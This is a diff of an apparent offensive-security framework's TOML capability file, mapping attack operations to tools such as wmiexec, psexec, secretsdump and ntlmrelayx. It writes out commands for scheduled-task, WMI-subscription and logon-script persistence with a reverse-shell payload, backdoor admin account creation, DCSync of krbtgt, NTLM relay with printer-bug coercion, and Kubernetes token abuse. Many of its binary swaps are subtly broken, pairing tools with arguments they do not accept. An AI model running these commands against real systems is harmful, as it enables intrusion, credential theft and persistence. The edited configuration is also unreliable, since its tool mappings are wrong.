 name = 'Schtasks Create Shell'
 args = ['{rhost}/{username}:{password}', 'schtasks /create /tn {task} /tr {payload} /sc onstart /ru system /f']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Schtasks Query Shell'
 args = ['{rhost}/{username}:{password}', 'schtasks /query /tn {task} /v /fo list']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Schtasks Run Shell'
 args = ['{rhost}/{username}:{password}', 'schtasks /run /tn {task}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Schtasks Delete Shell'
 args = ['{rhost}/{username}:{password}', 'schtasks /delete /tn {task} /f']
@@ -17799,56 +17802,56 @@ inputs = [
   { key = 'payload', type = 'file', required = false, default = 'C:\\Windows\\Temp\\rev.exe' },
 ]
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Filter Create'
 args = ['{rhost}/{username}:{password}', "powershell -c $f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name=\"TSecFilter\";EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}"]
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Consumer Create Cmd'
 args = ['{rhost}/{username}:{password}', 'powershell -c Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name="TSecConsumer";CommandLineTemplate="{payload}"}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Binding Create'
 args = ['{rhost}/{username}:{password}', 'powershell -c Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter="TSecFilter";Consumer="TSecConsumer"}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Subscription Enum'
 args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Consumer Enum'
 args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Binding Enum'
 args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Filter Teardown'
 args = ['{rhost}/{username}:{password}', "powershell -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='TSecFilter'\" | Remove-WmiObject"]
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Consumer Teardown'
 args = ['{rhost}/{username}:{password}', "powershell -c Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='TSecConsumer'\" | Remove-WmiObject"]
@@ -17916,28 +17919,28 @@ args = ['//{rhost}/c$', '-U', '{username}%{password}', '-c', 'ls "\\Users\\{user
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Startup Dir Shell Enum'
 args = ['{rhost}/{username}:{password}', 'dir "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Logon Script GPO Check'
 args = ['{rhost}/{username}:{password}', 'reg query "HKCU\\Environment" /v UserInitMprLogonScript']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Logon Script Set'
 args = ['{rhost}/{username}:{password}', 'reg add "HKCU\\Environment" /v UserInitMprLogonScript /t REG_SZ /d {payload} /f']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Startup Process Verify'
 args = ['{rhost}/{username}:{password}', 'wmic process get name,commandline']
@@ -17996,14 +17999,14 @@ args = ['{payload}', '/etc/init.d/{name}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'update-rc.d'
+binary = 'systemctl'
 [[capability.provider.operation]]
 name = 'Init Defaults Enable'
 args = ['{name}', 'defaults']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'chkconfig'
+binary = 'systemctl'
 [[capability.provider.operation]]
 name = 'Chkconfig Enable'
 args = ['--add', '{name}']
@@ -18369,21 +18372,21 @@ inputs = [
   { key = 'backdoor-pass', type = 'password', required = false, default = 'Tsec!2024x' },
 ]
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Windows User Create'
 args = ['{rhost}/{username}:{password}', 'net user {backdoor-user} {backdoor-pass} /add']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Admin Group Add'
 args = ['{rhost}/{username}:{password}', 'net localgroup administrators {backdoor-user} /add']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'User Enum Verify'
 args = ['{rhost}/{username}:{password}', 'net user {backdoor-user}']
@@ -18397,7 +18400,7 @@ args = ['smb', '{rhost}', '-u', '{backdoor-user}', '-p', '{backdoor-pass}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'User Delete Teardown'
 args = ['{rhost}/{username}:{password}', 'net user {backdoor-user} /delete']
@@ -18500,7 +18503,7 @@ args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{passw
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-net'
+binary = 'net'
 [[capability.provider.operation]]
 name = 'Add To Group Probe'
 args = ['{domain}/{username}:{password}@{rhost}']
@@ -18514,7 +18517,7 @@ args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--users']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getTGT'
+binary = 'getTGT.py'
 [[capability.provider.operation]]
 name = 'Persistent TGT Pull'
 args = ['{domain}/{username}:{password}']
@@ -18535,7 +18538,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'drsuapi
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'DC Sync Exec'
 args = ['{domain}/{username}:{password}@{rhost}', '-just-dc-user', 'krbtgt']
@@ -18682,14 +18685,14 @@ args = ['{artifacts}/macro.doc']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'oledump.py'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Macro Stream Dump'
 args = ['-s', '4', '{artifacts}/macro.doc']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'oledump.py'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Macro Stream Analyze'
 args = ['-a', '{artifacts}/macro.doc']
@@ -18875,7 +18878,7 @@ args = ['-f', '/etc/profile.d/{name}.sh', '/etc/cron.d/{name}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'update-rc.d'
+binary = 'systemctl'
 [[capability.provider.operation]]
 name = 'Init Entry Remove'
 args = ['-f', '{name}', 'remove']
@@ -20263,14 +20266,14 @@ args = ['smb', '{rhost}', '-u', 'guest', '-p', '']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Psexec RCE Chain'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbexec'
+binary = 'smbexec'
 [[capability.provider.operation]]
 name = 'Smbexec RCE Chain'
 args = ['{rhost}/{username}:{password}']
@@ -20313,7 +20316,7 @@ args = ['-p', '445', '--script', 'smb-vuln-*', '{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbclient'
+binary = 'smbclient'
 [[capability.provider.operation]]
 name = 'SMB Session Verify'
 args = ['{rhost}/{username}:{password}']
@@ -20374,7 +20377,7 @@ inputs = [
   { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
-binary = 'rpcdump'
+binary = 'rpcdump.py'
 [[capability.provider.operation]]
 name = 'Spooler Service Detect'
 args = ['{rhost}']
@@ -20388,7 +20391,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'spooler
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-printbugger'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Printer Bug Coerce'
 args = ['{rhost}/{username}:{password}', '{lhost}']
@@ -20402,35 +20405,35 @@ args = ['coerce', '--listener-ip', '{lhost}', '--target-ip', '{rhost}', '-u', '{
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Relay to SMB RCE'
 args = ['-t', '{rhost}', '-smb2support', '-i']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Relay to LDAP Dump'
 args = ['-t', 'ldap://{rhost}', '--no-validate']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Nightmare DLL Chain'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Spooler Service Check Shell'
 args = ['{rhost}/{username}:{password}', 'sc query spooler']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Driver Dir Enum Shell'
 args = ['{rhost}/{username}:{password}', 'dir C:\\Windows\\System32\\spool\\drivers']
@@ -20483,7 +20486,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'spooler
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Post Spooler Cred Dump'
 args = ['{rhost}/{username}:{password}']
@@ -21267,14 +21270,14 @@ network = true
 binary = 'kubectl'
 [[capability.provider.operation]]
 name = 'K8s Pod List'
-args = ['get', 'pods', '--all-namespaces', '--token', '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)', '--server', 'https://{rhost}:6443', '--insecure-skip-tls-verify']
+args = ['get', 'pods', '--all-namespaces', '--token', '/var/run/secrets/kubernetes.io/serviceaccount/token', '--server', 'https://{rhost}:6443', '--insecure-skip-tls-verify']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'kubectl'
 [[capability.provider.operation]]
 name = 'K8s Priv Pod Exec'
-args = ['exec', '-it', 'ts-pod', '--', '/bin/sh', '-c', 'id', '--token', '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)']
+args = ['exec', '-it', 'ts-pod', '--', '/bin/sh', '-c', 'id', '--token', '/var/run/secrets/kubernetes.io/serviceaccount/token']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -22120,7 +22123,7 @@ args = ['chain_report.py', '--rhost', '{rhost}', '--out', '/tmp/chain.json']
 output = 'json'
 network = false
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Foothold Consolidation Shell'
 args = ['{rhost}/guest:']
@@ -23308,7 +23311,7 @@ args = ['{iface}', '-b', '{bssid}', '-c', '{channel}', '-v', '4']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'one-sixtyone'
+binary = 'onesixtyone'
 [[capability.provider.operation]]
 name = 'Pin List Verify Alternate'
 args = ['{iface}', '{bssid}']
@@ -23512,7 +23515,7 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'hci0' } 
   { key = 'btaddr', type = 'mac', required = false }
 ]
 [[capability.provider]]
-binary = 'hciconfig'
+binary = 'bluetoothctl'
 [[capability.provider.operation]]
 name = 'Adapter Status Pull'
 args = ['{iface}']
@@ -23529,7 +23532,7 @@ args = ['{iface}', 'pscan', 'sscan']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'hcitool'
+binary = 'bluetoothctl'
 [[capability.provider.operation]]
 name = 'Inquiry Device Scan'
 args = ['scan', '{iface}']
@@ -23558,7 +23561,7 @@ args = ['info', '{btaddr}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'sdptool'
+binary = 'btgatt-client'
 [[capability.provider.operation]]
 name = 'Service Browse Target'
 args = ['browse', '{btaddr}']
@@ -23634,7 +23637,7 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'hci0' } 
   { key = 'bleaddr', type = 'mac', required = false }
 ]
 [[capability.provider]]
-binary = 'hcitool'
+binary = 'bluetoothctl'
 [[capability.provider.operation]]
 name = 'Lescan Sweep'
 args = ['lescan', '{iface}']
@@ -23658,7 +23661,7 @@ args = ['connect', '{bleaddr}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'gatttool'
+binary = 'btgatt-client'
 [[capability.provider.operation]]
 name = 'Gatt Primary Services'
 args = ['-b', '{bleaddr}', '--primary']
